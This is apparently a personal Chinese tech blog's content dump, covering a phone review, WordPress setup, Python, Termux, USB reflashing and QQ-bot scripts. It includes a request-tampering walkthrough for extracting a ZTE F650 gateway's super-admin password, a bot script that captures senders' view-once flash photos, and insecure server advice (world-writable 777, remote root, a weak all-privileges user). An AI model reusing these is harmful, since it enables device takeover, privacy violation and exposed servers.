作为本人的第一台智能手机，虽然很想预算拉满，奈何钱包实力不允许，最后在拼夕夕百亿补贴平台以1489RMB购入了黑色款8+128的这台机器。\n当时是22年的11月初，连续一个多月的网课使旧手机本就不富裕的电池容量更是雪上加霜。在一次线上考试途中手机直接黑屏断电后，本人毅然决然决定换手机。\n与家人商量后，家人表示支持并立刻打了钱过来，告诉我自己做决定。打来的钱和我原本有的（实际上大部分还是爸妈给的，呜呜家里人对我真好）加起来，预算在1500RMB左右。参考了朋友与酷安老哥们的推荐，最后选中了这台机器。下单，付款，接下来就是漫长的等待了。\n有个没拿到机子前就不爽的点：背刺。本以为我躲过了白色和512G的背刺，却没想到下单后十天相同价格在狗东旗舰店可以拿下8+256甚至是12+256的配置：（（（，不过好在这之后这机子的价格就没大跌了，所以还行。\n到货 因为疫情封控，下单后二十多天才收到手机。又因为我没有能拍清画面的手机，所以并没有外观图片，开箱视频还是借别人手机录制的\u0026hellip;\n拼夕夕北京发货，发货后就有了IMEI，在小米香港官网查询出库日期，为发货前7天，后封机概率比较低，此时我悬着的心下放了一半。\n到货后，检查完包装外观确认无瑕疵后，通电开机，通过系统引导，便开始了激动人心的MIUI体验。\n体验 外观 相对于先前用的手机来说，基本上都是优点，但也有几点不满意的地方，比如直角边框。虽然看起来挺不错，但是握持十分硌手\u0026hellip;所幸官方自带了清水壳，装上后十分圆润。\n摄像头突出，因为之前用的都是5、6年前的手机，所以对这点感触挺大的，没办法平放桌子上打引诱了：（，不过也能理解 这手机打音游会断触！！\n最不适应的是这个手机的比例，单手比较难点到上半部分内容，而且有些软件和游戏对这个比例没有适配。\n属性 到手先跑了一次娱乐兔，总分74w储存6.8万，应该是中等水平，我很满意。按照酷安里的方法查了屏幕和存储的厂家，分别是华星和三星（到手就看出来了是华星屏，因为用光侧照会发红），这应该不是一等奖就是二等奖了（按宣传华星比天马护眼，实际我也不知道了），不过三星跑分居然不如海力士，不科学。\n大电池带来的安全感满满的，90Hz下WIFI可刷10小时视频，后面日常120Hz差不多9h亮屏时长。\n相对于先前用的手机，这台的屏幕确实护眼，至少本人的眼疲劳得到了大大缓解，后面直接饱和度护眼拉满，妈妈再也不用担心我的视力了（不）。\n系统 这是我第一次长期使用MIUI，对比我之前使用的EMUI，体验升级了许多，不得不感慨技术的发展。比如先前为了实现全自动任务折腾Tasker，换MIUI后直接有了系统级的代替。但还是要批评MIUI机型区别对待，并且许多功能都需折腾后才能使用，比如自动任务、自动字幕等等。瑕不掩瑜，MIUI是目前我最喜欢的系统了，虽然还有许多能做得更好的地方。\n拍照 无压缩，图片较大，加载可能较慢\n不说话，放张旅游时用谷歌相机拍的图像，随手拍的。\n总结 非常棒手机，爱来自wuko（（（\n非常称心所愿的一个机子，非常符合我对于梦中情机的想象，科技并带着。。。咳咳，一连三个非常，突出表现了作者对该机型的极高评价。大概之后再也买不到这样的手机了吧，听说这代是红米Note系列的lCD绝唱，LCD党落泪TAT。\n","date":"2023-02-02T00:00:00Z","image":"https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/003_hu_25b6478f7d728415.jpg","permalink":"https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/","title":"Xiaomi XAGA 购机与使用体验"},{"content":"记：ECS 云服务器初体验——搭建一个WP站点 一，前言 本人为一名在校学生，未来方向为计算机软件工程。之前一直对于服务器有浓厚兴趣，并在本地也搭建过，但苦于没有公网地址以及专门的机器。经网上查阅以及朋友推荐，发现了阿里云的这个飞天加速计划，并成功领取到了一台ECS服务器。\n相对于我之前使用智能手机搭建的服务器，它有许多优点：公网IP、更强大的性能、更稳定的运行、更完整的操作系统\u0026hellip;这次就来一了我之前想要搭建一个网页导航的愿望。\n环境：Ubuntu 20.04\n二，连接服务器 一开始我打算使用我的PC连接，但因为win7并不自带ssh，遂手动安装，后也是成功连接到了服务器： 但ssh在我的win7系统中频繁崩溃，便打算在手机上用Termux连接到服务器，但\u0026hellip;这不是又得戳屏幕吗？\n就在我百思不得其解时，我发现在阿里云的控制面板中有一个名为Workbench远程连接的功能。在输入密码后，终于是可以开搞了。\n三，安装环境与依赖 安装Apache: 想要运行一个网站，就需要一个强大的后端。这里我选用了很多人都在用的 Apache。\n使用apt命令安装Apache和他的拓展包：\napt install apache2\n安装后用 service apache2 status查看状态：\n安装mysql: apt-get install mysql-server mysql-client\n同样使用 service mysql status查看状态\n使用命令 cat查看默认密码 /etc/mysql/debian.cnf：\nsudo cat /etc/mysql/debian.cnf\n返回：\n1 2 3 4 5 6 7 8 9 10 11 12 13 Automatically generated for Debian scripts. DO NOT TOUCH! [client] host = localhost user = debian-sys-maint password = ******** socket = /var/run/mysqld/mysqld.sock [mysql_upgrade] host = localhost user = debian-sys-maint password = ******** socket = /var/run/mysqld/mysqld.sock 记住你的密码（Password），后面要用到。\n开放端口 在 控制面板\u0026gt;网络与安全\u0026gt;安全组中新增入方向：\n注意：开放端口意味着其他人也可以在公网下访问你的服务器\n完成后访问 http://YOURIP/:\n成功工作！\n安装PHP sudo apt install php libapache2-mod-php\n安装后重启Apache：\nsudo systemctl restart apache2\n使用 echo 命令创建一个PHP页面：\necho \u0026quot;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026quot; \u0026gt; /var/www/html/phpinfo.php\n访问 http://YOURIP/phpinfo.php，出现页面即为成功安装PHP\n至此，所有的环境与依赖安装完毕。\n四、wordpress的安装 下载Wordpress的安装包（建议直接下载到 **/var/www/**下）：\nwget https://cn.wordpress.org/latest-zh_CN.tar.gz\n下载后使用 tar命令解压：\ntar -xvf latest-zh_CN.tar.gz\n解压后切换到wordpress目录，使用 cp命令重命名示例配置文件为 wp-config.php\ncp wp-config-sample.php wp-config.php\n编辑它，将你的数据库信息放进去。\n之后打开 http://YOURIP/wordpress/wp-admin/install.php，按照提示即可！\n大功告成！\nhttps://imgtu.com/i/jOX0HS)\n五，踩到的坑与总结 初次接触MySQL，无法登陆root用户 原来只在内网环境下搭建过WP，当时只懂得对着教程CTRL+C/V。因为当时数据库和电脑是在同一个IP下，所以安装完MySQL后不用配置就直接可以安装WP；而这次数据库并不在本地，因此在本地连接时我遇到了这样的问题：\n1 mysqli_real_connect(): (HY000/1698): Access denied for user \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; 当时遇到这个问题，我卡了4个多小时，尝试过重启MySQL、Apache等等，但都没有解决。后来上网查发现可能是root用户主机设置的问题，于是在服务器进入查询：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt;use mysql \u0026gt;select host, user from user; +-----------+------------------+ | host | user | +-----------+------------------+ | localhost | root | | localhost | debian-sys-maint | | localhost | mysql.infoschema | | localhost | mysql.session | | localhost | mysql.sys | +-----------+------------------+ 8 rows in set (0.00 sec) 果然我的root用户仅允许我在本地登录，于是我按照教程说的修改host：\n1 2 3 update user set host=\u0026#39;%\u0026#39; where user=\u0026#39;root\u0026#39;; flush privileges; 查询后发现root的host确实变成了%，于是我再次尝试登录，却发现问题依然存在：\nmysqli_real_connect(): (HY000/1698): Access denied for user 'root'@'localhost'\n最后没招了，突然有个想法，新建一个用户并给予其最大权限：\n1 2 CREATE USER \u0026#39;pmauser\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;mypassword\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;pmauser\u0026#39;@\u0026#39;%\u0026#39; WITH GRANT OPTION; 然后用这个用户登录，果然成功登录！\n上传的文件大小超过php.ini文件中定义的upload_max_filesize值。 在我为我的WP站点上传主题zip时，我遇到了这个问题。报错也非常明了，于是我在之前安装PHP时生成的phpinfo.php页面找到了我的php.ini文件路径：\n1 Loaded Configuration File\t/etc/php/7.4/apache2/php.ini 直接vim编辑，在里面找到了：\n1 upload_max_filesize = 2M 修改为7M，这个问题解决！然后新的问题又出现了。\n无法创建目录 wp-content/uploads/2022/07。它的父目录是否可以被服务器写入 修了一个bug,又出来一个，此时我心情复杂。继续上网查，发现可能是文件读取权限不够，于是直接使用chmod命令把www文件夹以及里面的文件权限都改为777：\n1 chmod -R 777 /www 后再次尝试，终于成功！\n最后的话 这次很荣幸能试用这台ECS服务器，也了解到了许多之前没有了解过的领域：比如Apache、MySQL等等，并且又学到了许多新的Linux和SQL命令。也感谢阿里云能够推出这项活动来使全国各地的高校学生能够亲自上手体验一台云服务器。\n六，成品展示 ","date":"2022-07-23T00:00:00Z","image":"https://blog.wuko.top/posts/2022/07/23/buildblog2.html/cover_hu_fde9aa24fb724fd.jpg","permalink":"https://blog.wuko.top/posts/2022/07/23/buildblog2.html/","title":"记：ECS 云服务器初体验——搭建一个WP站点"},{"content":"前情提要 本地的电信免费给换了光猫(新光猫不带wifi功能\u0026hellip;)旧光猫就没用了，所以能拿来瞎搞了。这次尝试破解其超级管理员密码。\n借鉴:不拆机破解电信光猫的超级密码（适用于中兴ZXHN F650）\n设备信息(不一样可能会失效) `设备类型\nGPON天翼网关(4口单频)\n产品型号\nZXHN F650\n软件版本号\nV2.0.0P1T3`\n正文 因为先前这个网关的wifi是关闭着的，所以先用网线接到了电脑上，进入192.168.1.1输入默认用户密码打开了无线功能，方便后面用手机调试(因为本人电脑过于拉胯，故许多操作都用手机，实际上仅用电脑便可实现全部操作)。\n插入U盘，打开网关储存管理中U盘文件管理。\n下载抓包软件Fiddler，点击Rules\u0026ndash;Automatic Breakpoints\u0026ndash;Before Requests(汉化版为规则\u0026gt;自动断点\u0026gt;请求前)\n返回浏览器文件管理界面，点击任意文件。\n返回Fiddler，查看拦截下的请求，修改body中的path中的value为/。\n终止拦截:点击Rules\u0026ndash;Automatic Breakpoints\u0026ndash;Disabled(汉化版为规则\u0026gt;自动断点\u0026gt;关闭)\n返回浏览器网关界面，发现进入网关根目录。\n进入/userconfig/cfg，找到db_user_cfg.xml后复制其至U盘，弹出U盘后插入至电脑。\n下载软件RouterPassView(警惕p2p下崽器，误点请直接结束进程，血的教训)\n打开RouterPassView，导入刚才的文件db_user_cfg.xml(CTRL+O)，CTRL+F搜索telecomadmin，然后就看到了你的超级管理账号和密码啦！\n之后输入超管账号密码即可进入高级设置，记得关掉网关的远程通信以防止超级管理密码被远程修改。\n","date":"2022-03-21T00:00:00Z","permalink":"https://blog.wuko.top/posts/2022/03/21/tianyigwpj.html/","title":"记:天翼网关ZXHN F650V2.0.0P1T3超管破解"},{"content":"最近写QQbot脚本的时候，遇到了一个问题：\n需要在a.py文件中导入同目录下另一个文件夹plugins中的b.py文件。\n网上的方法稍加变动，最后实现了：\na.py:\n1 2 3 4 5 6 import sys sys.path.append(sys.path[0] + \u0026#34;/plugins/\u0026#34;) import b print(b.test()) b.py:\n1 2 3 def test(): text = \u0026#34;hi\u0026#34; return text 输出: hi\n原理大概理解了:\n先在终端里查看sys.path:\n1 2 3 \u0026gt;\u0026gt; print(sys.path) \u0026gt;\u0026gt; [\u0026#39;/storage/emulated/0/1USER/termux/python\u0026#39;, \u0026#39;/data/data/com.termux/files/usr/lib/python310.zip\u0026#39;, \u0026#39;/data/data/com.termux/files/usr/lib/python3.10\u0026#39;, \u0026#39;/data/data/com.termux/files/usr/lib/python3.10/lib-dynload\u0026#39;, \u0026#39;/data/data/com.termux/files/usr/lib/python3.10/site-packages\u0026#39;] 会发现默认的模块路径是一个列表，并且第一个就是我们所在的路径。\n那么接下来想要导入不同路径的py文件，可以把它看做一个模块，再导入。\n先在b.py所在路径创建一个__init__.py文件，模块默认必须得有此文件，可以为空也可以初始化一些数据。\n然后在a.py中使用append()在sys.path列表中添加b.py所在的路径/storage/emulated/0/1USER/termux/python/plugins/，因为为了确保在不同设备运行，所以先获取运行的绝对路径sys.path[0]，然后再在后面加上/plugins/，所以就是:\n1 sys.path.append(sys.path[0] + \u0026#34;/plugins/\u0026#34;) 最后导入b.py就可以了！\n","date":"2022-01-14T00:00:00Z","permalink":"https://blog.wuko.top/posts/2022/01/14/py_diffimport.html/","title":"记:Python导入不同路径文件"},{"content":" 最近更新了下termux，结果配置被清了，启动语变成了原版，所以借此机会记录下修改termux启动语为screenfetch，以免下次忘记。\n安装 screenfetch 包: pkg install screenfetch\n输出至启动语文件 screenfetch \u0026gt; $PREFIX/etc/motd\n新建活动窗口 大功告成！\n","date":"2021-12-04T00:00:00Z","permalink":"https://blog.wuko.top/posts/2021/12/04/tremux%E5%90%AF%E5%8A%A8%E8%AF%AD%E4%BF%AE%E6%94%B9%E4%B8%BAscreenfetch.html/","title":"Termux启动语改为Screenfect"},{"content":" 该页面为原wp发布内容，转md格式后可能会有部分格式异常\n这是个广告:如果您需要人工搭建却不会或懒得动手，可以联系我人工搭建(有偿)，请联系邮箱admin@wuko.top或微信wuko233(请备注来意)，感谢支持。\n相信很多人都像我一样想要一个在互联网上一个属于自己的小天地，可以实现这个愿望的，除了依托于各大网站的空间功能，我们还可以搭建一个完全属于你的个人博客，不但相对第三方平台更加独立，而且更加便于交流，你的文章也不会因平台说没就没。(除非删库跑路)\n本篇文章会以纯小白的视角来从零开始介绍，还可以搭配网络上的教程视频配合食用。[heimu]虽然安装wordpress为全傻瓜操作，但我还是决定写这篇教程，绝对不是因为建站快一年一篇正式文章也没有写而来凑数的！([/heimu]\n一，准备工作 [danger]能够上网的设备一台(如手机，电脑、智能冰箱等)\n善于理解的大脑与勤善于实践的手\n最好自备科学[/danger]\n1，服务器的准备\n想要安放你那无处安放的魅力，就需要有一台服务器(或虚拟主机)来储存你的网站。你可以选择在各大服务器商购买服务器/虚拟主机(如阿里云，西部数码等)，也可以选择其它云的免费主机服务。但值得注意的是，这些主机大都可能会随时跑路，如果你不是像我一样是家境贫寒学生党，还请尽量购买大厂服务器。\n购买服务器时，要注意服务器的配置与流量，一般来说，1核2G内存足够带动你的个人博客。除了注意配置，还需注意服务器的系统与你想要装的博客系统之间的兼容性，如我们下面要安装的Wordpress就需要Linux系统。\n除系统外，你还需要注意服务器的位置，若服务器位于国内(香港澳门台湾除外)，你还需要对自己的域名进行备案，未备案的域名无法使用国内服务器。\n[heimu]除购买服务器外，你还可以将自己的移动设备或电脑用作服务器，再加上内网穿透即可实现服务器功能，但该方法不但需要支付内网穿透费用，对你的设备也会有不小的损耗，且方法繁琐，只适合喜欢鼓捣的老哥鼓捣。[/heimu]\n2，域名的准备\n除服务器外，第二重要的便是域名了。在域名方面你可以选择顶级域名(xxx.xxx)与二级域名(xxx.xxxx.xxx)。网络上有许多免费的二级域名解析，但极易被浏览器或通讯软件标记为危险网站。顶级域名除tk、ml等非洲国家顶级域名外，均需购买，且价格不等(尤其是溢价域名(;´Д`))，可根据需求查看各大域名商价位表(如阿里万网、西部数码等)。\n值得一提，你的域名会极大程度的影响你的SEO(搜索引擎优化，利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名)，二级域名基本可以不用想了，而免费的顶级域名也基本不会有SEO，所以还是建议购买顶级域名。\n在域名的选择上，一定要简洁、明了、好记、干净。\n二，正式开始 1，域名DNS解析与绑定服务器\n在你购买域名后，大都会指引你去DNS解析，你可以选择由域名商提供的DNS解析，也可以自行寻找其它服务商。\n在你的主机控制面板中，找到\u0026quot;绑定域名\u0026quot;，内容大致如下图:\n你只需要复制要解析的记录值，即域名/地址（红字）并记住解析类型（常见有A、CNAME等）。打开DNS解析，大致内容如下图:\n根据刚才主机面板的信息来选择记录类型，记录值填写你复制的内容，主机记录则填写你需要的二级域名，以域名wuko.top举例:主机记录:@，则解析后的域名为wuko.top；主机记录:www，则解析后的域名为www.wuko.top。根据你个人的需要来选择。\n解析后，再返回主机控制面板，将你刚刚解析的域名绑定至主机。\n2，下载与安装Wordpress 在上面的步骤中，你已经初步搭建好了你的网站，现在只需要为你的网站装一个对外展示的系统，wordpress。\n打开https://cn.wordpress.org/download/，点击下载最新版本wordpress的压缩包。\n因wordpress服务器在国外，故下载速度感人，你可以用魔法或自行在网路上寻找压缩包下载，老版本也不要紧，安装后在服务器中再更新。突然发现wp有中文官网，而且专门对国内进行了优化，速度还可以，所以把上面的链接改成了中文官网。\n打开你的服务器控制面板，找到在线文件管理器，进入根目录，将你下载好的安装包上传并解压。\n访问**\u0026ldquo;你的域名/wp-admin/install.php\u0026rdquo;**，一般情况下会出现下面的页面:\n非一般情况下你可能会遇到诸如数据库不可用等问题，点击修复不管用可以尝试重启服务器、重启数据库，如果还有问题请百度或下面留言。\n]\n点击下一步，根据提示语填入相应内容。确认无误后点击提交。\n点击现在安装，填写相关信息，注意:除用户名外大部分都可再次修改(大概)，用户名建议别叫admin，密码不要用数据库密码。填写完成后继续。\n成功安装！开始你的Wordpress之旅吧！\n点击登录访问博客后台，输入用户名密码即可进入控制面板。\n访问你的网站的域名，即可进入博客前台。\nHello World!\n三，写在最后 这篇文章从去年的10月18日开始编写，一直到今天21年的5月15日才完成，除了现实中的一些麻烦事，最主要还是我的拖延症，几个月前的计划已经排到了2022年(笑)。如您所见，本文所有操作均用手机完成(下半部分是安装在了之前的4c手机上，详情见 旧手机利用计划\u0026rsquo;局域网离线观看+弹幕)。\n希望本篇文章能够给到您帮助，如果还有问题请留言或查看文章开头。感谢您阅读本文！共勉！\n2021.5.15\n","date":"2021-05-15T00:00:00Z","permalink":"https://blog.wuko.top/posts/2021/05/15/buildblog.html/","title":"从无到有丨零基础个人博客搭建"},{"content":"Wed, 17 Feb 2021 04:22:39 +0000\n前情提要:家里有一个16g优盘，因不明原因计算机可识别无法读取（请插入磁盘H:/I:）\n使用工具:\nWinXP\nChipGenius芯片精灵\nSMI(慧荣)量产工具*\n（量产工具须根据u盘主控型号选择）\n1，ChipGenius芯片精灵\n在互联网上搜索下载，尽量使用最新版本的芯片精灵\n下载打开后，在USB设备列表中选定u盘，下方会出现详细信息:\n设备描述: \u0026#91;H:]USB Mass Storage Device(USB MEMORY BAR)　设备类型: 大容量存储设备　协议版本: USB 2.00　当前速度: 全速(FullSpeed)　电力消耗: 100mA USB设备ID: VID = 090C PID = 3000 设备供应商: Silicon Motion,Inc.　设备名称: SM3255AA MEMORY BAR 设备修订版: 0100　产品型号: USB MEMORY BAR 产品修订版: 1000　主控厂商: SMI(慧荣)　主控型号: SM3257ENLT - ISP NONE 闪存识别码: ******* - SanDisk(闪迪) - 1CE/单通道 \u0026#91;MLC] -\u003e 总容量 = 16GB　在线资料: http://dl.mydigit.net/special/up/smi.html 2，量产工具\n在详细信息中找到主控型号，Ctrl+c复制下来，在互联网上搜索型号+量产工具，比如我的是SM3257ENLT量产工具。\n下载打开量产工具\n点击\"Scan USB\"或\"扫描USB\"，会出现下图样式：\n如果量产工具中未发现u盘，就再去尝试几个其它版本的量产工具，我也是试了几个量产工具后才成功。\n量产可以在\"Setting\"或\"设置\"中设置选项。\n选中显示Ready的项目，点击开始或Start，进行u盘量产，耐心等待……直到开始按钮上方出现大大的OK：\n截屏请只参考右上角OK 打开我的电脑，进入u盘，测试读写，成功！\n","date":"2021-02-17T00:00:00Z","permalink":"https://blog.wuko.top/posts/2021/02/17/udiskliangchan.html/","title":"【分享】记一次成功的u盘量产"},{"content":"Sat, 20 Jun 2020 02:41:12 +0000\n我的讨论群:877789015，欢迎加群共同进步！戳我加群\n一，认识JSON中的键与值 以下内容摘自:百度百科\nJSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。\n当然，你并不需要彻底了解JSON的格式用法，因为我们只需要用到一部分，所以你只需要记住键与值是什么意思，便于阅读下文。详情请看下图:\n键与值 二，$访问$命令 想要调用api数据，就要先了解HTTP其中的两种请求方式:GET与POST。(什么是HTTP请自行使用搜索引擎，这里不多赘述)\nGET - 从指定的资源请求数据。\nPOST - 向指定的资源提交要被处理的数据\n通俗来讲，GET就是直接获取，而POST是向服务器发送数据，服务器再返回结果。\n那我们如何在QR的词库中应用呢？那就要用到$访问$命令了。$访问$主要有两种格式，分别对应GET与POST:\n$访问 网址$\n$访问 POST 网址 post参数$\n因为大多数API接口都是GET方法，所以下面以GET形式为例。\n三，应用 嘿嘿，我们这儿有一个API的接口，直接使用$访问 链接$或用浏览器访问，就会出现以下结果:\n(静态的。。。仅供参考) 但我们需要的是msg和content里的文本，那该怎么办呢？\n先来看msg:\nAPI测试 //命令\nA:$访问 xxxxxxxxx$\nB:@A[msg]\n首先，我们先将变量A赋予$访问$命令，接下来在变量B中赋予@%A%[键名] (解释一下，取一个键的值命令为@数据[键名])，这样，我们就能获得键msg的值A了。\n那么，如何获取data中content的值呢？其实是差不多的:\n我们来试试，可以看到，我们顺利的获取到了content的值:\n最后补充一下，一般提供api服务的都会标明提供的API的返回格式，请求方法，请求/返回参数等，根据个人需求来运用。\n","date":"2020-06-20T00:00:00Z","permalink":"https://blog.wuko.top/posts/2020/06/20/qrbotusejson.html/","title":"【旧】QQ机器人:如何用QRspeed调用json格式的API接口"},{"content":"Wed, 06 May 2020 16:54:26 +0000\n我的讨论群:877789015，欢迎加群共同进步！戳我加群\n一，检测闪照 成果展示\n首先，第一行需要能够检测到闪照:\n[高级].*闪照.* 其中，[高级]指高级信息，如闪照、xml信息等。因为在老版本QQ中，闪照消息为:[闪照]请使用新版手机QQ查看闪照。故我们只需要确定信息中有“闪照”二字，就能检测到闪照。\n二，获取闪照直链 我们已经检测到了闪照，接下来只需要把它以图片或直链形式反馈回来:\n我们要用到变量%FIMG0%。%FIMG0%的用法和%IMG0%差不多，都是用来表示图片的代号。\n首先，我们先新建一个变量A，设A值为1%FIMG0%\n在A的下方再创建一个变量B，值为:$取中间 Э %A%Э1Э.$\n(这里解释下，$取中间 Э 原内容Э开头Э结尾$，所以变量B意为取变量A中1与.之间的内容，在%FIMG0%前加个1就是为了方便，因为直接%FIMG0%后内容是XXX.图片格式)\n在我们写好上面的内容后，加上下面这段前缀，就是图片的直链。\nhttp://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-%B%/0\n腾讯图片直链 三，发送闪照 图片直链有了，图片也就好发了，只要用±img=图片直链/本地路径±就能把闪照发出去了！\n例子:\n±img=http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-%B%/0±\n四，完整实例 [hide reply_to_this=\"true\"]\n[高级].*闪照.*\nA:1%FIMG0%\nB:$取中间 Э %A%Э1Э.$±img=http://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-%B%/0±\n发送者:%昵称%(%QQ%)\\r\nhttp://gchat.qpic.cn/gchatpic_new/2641296238/735524882-3219132080-%B%/0\n[/hide]\n\u0026nbsp;\n","date":"2020-05-06T00:00:00Z","permalink":"https://blog.wuko.top/posts/2020/05/06/qrbotshantu.html/","title":"【旧】QQ机器人:如何利用QRSpeed查看闪照？"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] One line code block 1 \u0026lt;p\u0026gt;A paragraph\u0026lt;/p\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nStack has built-in support for math typesetting using KaTeX.\nIt\u0026rsquo;s not enabled by default side-wide, but you can enable it for individual posts by adding math: true to the front matter. Or you can enable it side-wide by adding math = true to the params.article section in config.toml.\nInline math This is an inline mathematical expression: $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$\n1 $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$ Block math $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$ 1 2 3 $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$ $$ f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi $$ 1 2 3 4 5 6 7 8 9 10 11 12 13 $$ f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi $$ ```Stack has built-in support for math typesetting using [KaTeX](https://katex.org/). **It\u0026#39;s not enabled by default side-wide,** but you can enable it for individual posts by adding `math: true` to the front matter. Or you can enable it side-wide by adding `math = true` to the `params.article` section in `config.toml`. ## Inline math This is an inline mathematical expression: $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$ ```markdown $\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887…$ Block math $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$ 1 2 3 $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$ $$ f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi $$ 1 2 3 $$ f(x) = \\int_{-\\infty}^\\infty\\hat f(\\xi)\\,e^{2 \\pi i \\xi x}\\,d\\xi $$ Hugo theme Stack supports the creation of interactive image galleries using Markdown. It\u0026rsquo;s powered by PhotoSwipe and its syntax was inspired by Typlog.\nTo use this feature, the image must be in the same directory as the Markdown file, as it uses Hugo\u0026rsquo;s page bundle feature to read the dimensions of the image. External images are not supported.\nSyntax 1 ![Image 1](1.jpg) ![Image 2](2.jpg) Result Photo by mymind and Luke Chesser on Unsplash\nFor more details, check out the documentation.\nBilibili video Tencent video YouTube video Generic video file Your browser doesn't support HTML5 video. Here is a link to the video instead. Gist GitLab Quote Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n― A famous person, The book they wrote Photo by Codioful on Unsplash\nThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 